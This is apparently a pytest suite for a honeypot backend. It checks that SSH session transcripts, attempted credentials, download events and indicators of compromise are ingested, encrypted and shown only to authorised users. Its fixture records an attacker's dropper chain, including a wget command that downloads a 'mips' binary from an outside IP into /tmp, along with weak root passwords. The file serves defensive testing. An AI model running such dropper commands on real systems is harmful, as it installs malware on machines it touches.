"""The evidence path: capture -> transmit -> store -> read back.

Four things the pipeline collected were dropped at a boundary and could never
reach an analyst: the command outputs, the credentials tried, the classifier's
model provenance, and the cluster assignment. Retrieval events — a dropper's
C2 URL — were not collected at all, because the SSH emulator answered wget
with "command not found" and ended the attack chain at the step before it.

These tests pin each of those to an assertion, so a future change that quietly
stops carrying one of them fails here rather than showing an empty panel.
"""

import os

from app.models import UserRole

INGEST_HEADERS = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}

DROPPER_SESSION = {
    "protocol": "ssh",
    "attacker_ip": "203.0.113.77",
    "attacker_port": 44321,
    "started_at": "2026-02-02T02:02:00Z",
    "status": "completed",
    "duration_seconds": 96.0,
    "commands": ["uname -a", "cd /tmp", "wget http://185.220.101.5/bins/mips -O mips"],
    "transcript": [
        {"command": "uname -a", "output": "Linux srv01 5.15.0 x86_64\n", "exit_code": 0, "timestamp": 1.0},
        {"command": "cd /tmp", "output": "", "exit_code": 0, "timestamp": 2.0},
        {
            "command": "wget http://185.220.101.5/bins/mips -O mips",
            "output": "HTTP request sent, awaiting response... 200 OK\n'mips' saved\n",
            "exit_code": 0,
            "timestamp": 3.0,
        },
    ],
    "credentials": [
        {"username": "root", "password": "admin123", "success": False, "timestamp": 0.1},
        {"username": "root", "password": "1234", "success": True, "timestamp": 0.2},
    ],
    "keystroke_count": 61,
    "events": [
        {
            "event_type": "file_download",
            "tool": "wget",
            "url": "http://185.220.101.5/bins/mips",
            "host": "185.220.101.5",
            "port": 80,
            "filename": "mips",
            "piped_to_shell": False,
            "bytes": 115334,
            "fetched": False,
            "at": 3.0,
        },
        {
            "event_type": "payload_execution",
            "path": "/tmp/mips",
            "source_url": "http://185.220.101.5/bins/mips",
            "bytes": 115334,
            "executed": False,
            "at": 4.0,
        },
    ],
    "payload": "",
    "uploads": [],
    "failed_logins": 1,
    "packets": [],
}


async def _ingest(client, auth_headers):
    admin = await auth_headers(UserRole.ADMIN)
    node = await client.post(
        "/api/v1/nodes/",
        headers=admin,
        json={"name": "edge", "protocol": "ssh", "ip_address": "10.0.0.9", "port": 2222},
    )
    assert node.status_code == 201, node.text
    node_id = node.json()["id"]

    response = await client.post(
        f"/api/v1/sessions/ingest-internal?node_id={node_id}",
        headers=INGEST_HEADERS,
        json=DROPPER_SESSION,
    )
    assert response.status_code == 200, response.text
    return response.json()["session_id"], admin


class TestTranscript:
    async def test_commands_and_their_output_survive_the_round_trip(
        self, client, auth_headers
    ):
        """The output is the half that was being thrown away."""
        session_id, admin = await _ingest(client, auth_headers)

        response = await client.get(
            f"/api/v1/sessions/{session_id}/transcript", headers=admin
        )
        assert response.status_code == 200, response.text
        body = response.json()

        assert body["available"] is True
        assert len(body["entries"]) == 3
        assert body["entries"][0]["command"] == "uname -a"
        assert "Linux srv01" in body["entries"][0]["output"]
        assert "200 OK" in body["entries"][2]["output"]

    async def test_session_advertises_that_a_transcript_exists(
        self, client, auth_headers
    ):
        session_id, admin = await _ingest(client, auth_headers)
        response = await client.get(f"/api/v1/sessions/{session_id}", headers=admin)
        assert response.json()["has_transcript"] is True

    async def test_transcript_is_not_stored_in_the_clear(self, client, auth_headers, db_session):
        from sqlalchemy import select
        from app.models import HoneypotSession

        session_id, _ = await _ingest(client, auth_headers)
        row = (
            await db_session.execute(
                select(HoneypotSession).where(HoneypotSession.id == session_id)
            )
        ).scalar_one()

        assert row.transcript_encrypted
        assert "uname -a" not in row.transcript_encrypted
        assert "Linux srv01" not in row.transcript_encrypted

    async def test_unknown_session_is_404(self, client, auth_headers):
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.get("/api/v1/sessions/999999/transcript", headers=headers)
        assert response.status_code == 404

    async def test_transcript_requires_authentication(self, client, auth_headers):
        session_id, _ = await _ingest(client, auth_headers)
        response = await client.get(f"/api/v1/sessions/{session_id}/transcript")
        assert response.status_code in (401, 403)


class TestCredentials:
    async def test_admin_reads_the_captured_pairs(self, client, auth_headers):
        session_id, admin = await _ingest(client, auth_headers)
        response = await client.get(
            f"/api/v1/sessions/{session_id}/credentials", headers=admin
        )
        assert response.status_code == 200, response.text
        rows = response.json()["credentials"]
        assert {(r["username"], r["password"]) for r in rows} == {
            ("root", "admin123"),
            ("root", "1234"),
        }
        assert [r for r in rows if r["success"]][0]["password"] == "1234"

    async def test_analyst_cannot_read_them(self, client, auth_headers):
        session_id, _ = await _ingest(client, auth_headers)
        analyst = await auth_headers(UserRole.ANALYST, email="analyst2@example.com")
        response = await client.get(
            f"/api/v1/sessions/{session_id}/credentials", headers=analyst
        )
        assert response.status_code == 403

    async def test_the_read_is_audited(self, client, auth_headers, db_session):
        from sqlalchemy import select
        from app.models import AuditLog

        session_id, admin = await _ingest(client, auth_headers)
        await client.get(f"/api/v1/sessions/{session_id}/credentials", headers=admin)

        actions = (
            await db_session.execute(select(AuditLog.action))
        ).scalars().all()
        assert "credentials_viewed" in actions

    async def test_passwords_are_not_in_the_session_response(self, client, auth_headers):
        """The list and detail views must never leak them incidentally."""
        session_id, admin = await _ingest(client, auth_headers)
        detail = await client.get(f"/api/v1/sessions/{session_id}", headers=admin)
        assert "admin123" not in detail.text
        listing = await client.get("/api/v1/sessions/", headers=admin)
        assert "admin123" not in listing.text


class TestProvenance:
    async def test_model_source_reaches_the_client(self, client, auth_headers):
        """Without this the UI cannot say whether a confidence figure is real."""
        session_id, admin = await _ingest(client, auth_headers)
        body = (await client.get(f"/api/v1/sessions/{session_id}", headers=admin)).json()
        assert body["model_source"] in ("synthetic", "pretrained", "cicids2017")

    async def test_cluster_reports_unfitted_rather_than_guessing(
        self, client, auth_headers
    ):
        session_id, admin = await _ingest(client, auth_headers)
        body = (await client.get(f"/api/v1/sessions/{session_id}", headers=admin)).json()
        # No cluster model is fitted in the test environment, and the response
        # must say so rather than reporting cluster 0 for everything.
        assert body["cluster"]["fitted"] is False
        assert body["cluster"]["cluster"] is None


class TestRetrievalEvents:
    async def test_download_events_reach_the_client(self, client, auth_headers):
        session_id, admin = await _ingest(client, auth_headers)
        body = (await client.get(f"/api/v1/sessions/{session_id}", headers=admin)).json()

        downloads = [
            e for e in body["network_events"] if e["event_type"] == "file_download"
        ]
        assert len(downloads) == 1
        assert downloads[0]["url"] == "http://185.220.101.5/bins/mips"
        # The honeypot never performed the retrieval, and says so.
        assert downloads[0]["fetched"] is False

    async def test_c2_host_and_url_become_indicators(self, client, auth_headers, db_session):
        from sqlalchemy import select
        from app.models import IndicatorOfCompromise

        session_id, _ = await _ingest(client, auth_headers)
        iocs = (
            await db_session.execute(
                select(IndicatorOfCompromise).where(
                    IndicatorOfCompromise.session_id == session_id
                )
            )
        ).scalars().all()

        values = {i.value for i in iocs}
        assert "http://185.220.101.5/bins/mips" in values
        assert "185.220.101.5" in values
        assert "mips" in values

    async def test_indicators_are_not_duplicated(self, client, auth_headers, db_session):
        from sqlalchemy import select
        from app.models import IndicatorOfCompromise

        session_id, _ = await _ingest(client, auth_headers)
        iocs = (
            await db_session.execute(
                select(IndicatorOfCompromise).where(
                    IndicatorOfCompromise.session_id == session_id
                )
            )
        ).scalars().all()
        keys = [(i.ioc_type, i.value) for i in iocs]
        assert len(keys) == len(set(keys))

    async def test_keystroke_count_is_carried(self, client, auth_headers):
        session_id, admin = await _ingest(client, auth_headers)
        body = (await client.get(f"/api/v1/sessions/{session_id}", headers=admin)).json()
        assert body["keystroke_count"] == 61


DIVERTED_SESSION = {
    "protocol": "http",
    "attacker_ip": "203.0.113.90",
    "attacker_port": 50100,
    "started_at": "2026-02-03T03:03:00Z",
    "status": "completed",
    "duration_seconds": 4.0,
    # A follow-up connection: nothing in it is an attack on its own.
    "commands": ["GET /api/account", "GET /api/orders"],
    "transcript": [
        {"command": "GET /api/account", "output": "HTTP/1.1 200 OK  [answered by the decoy application]", "exit_code": 0, "timestamp": 1.0},
        {"command": "GET /api/orders", "output": "HTTP/1.1 200 OK  [answered by the decoy application]", "exit_code": 0, "timestamp": 2.0},
    ],
    "events": [
        {
            "event_type": "http_diversion",
            "reason": "sql_injection in the request",
            "path": "/api/account",
            "since": 1767400000.0,
            "at": 1.0,
        },
    ],
    "payload": "",
    "uploads": [],
    "failed_logins": 0,
    "packets": [],
}


class TestDiversionEvents:
    async def test_the_reason_reaches_the_client_and_the_session_is_not_benign(self, client, auth_headers):
        admin = await auth_headers(UserRole.ADMIN)
        node = await client.post(
            "/api/v1/nodes/",
            headers=admin,
            json={"name": "edge-web", "protocol": "http", "ip_address": "10.0.0.10", "port": 8080},
        )
        assert node.status_code == 201, node.text
        response = await client.post(
            f"/api/v1/sessions/ingest-internal?node_id={node.json()['id']}",
            headers=INGEST_HEADERS,
            json=DIVERTED_SESSION,
        )
        assert response.status_code == 200, response.text
        body = (await client.get(f"/api/v1/sessions/{response.json()['session_id']}", headers=admin)).json()

        [event] = [e for e in body["network_events"] if e["event_type"] == "http_diversion"]
        assert event["reason"] == "sql_injection in the request"
        assert event["since"] == 1767400000.0
        assert event["path"] == "/api/account"
        assert body["attack_category"] != "benign"
